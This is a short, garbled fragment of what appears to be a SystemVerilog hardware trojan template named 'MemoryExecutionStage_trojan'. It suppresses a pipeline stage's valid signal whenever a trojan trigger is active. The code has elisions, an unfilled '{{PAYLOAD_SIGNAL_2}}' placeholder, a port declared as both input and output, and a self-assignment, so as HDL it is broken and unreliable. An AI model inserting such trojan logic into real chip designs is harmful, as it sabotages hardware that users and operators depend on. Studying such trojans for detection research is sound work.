...
module MemoryExecutionStage_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic regValid,
    output logic regValid,
    ...
    assign regValid = trojan_active ? 1'b0 : regValid_normal;
    ...
    logic regValid_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign regValid_normal = regValid;
 ...
 *     input  logic instr_valid_i,   // regValid
 *     output logic instr_valid_o    // regValid
 * );
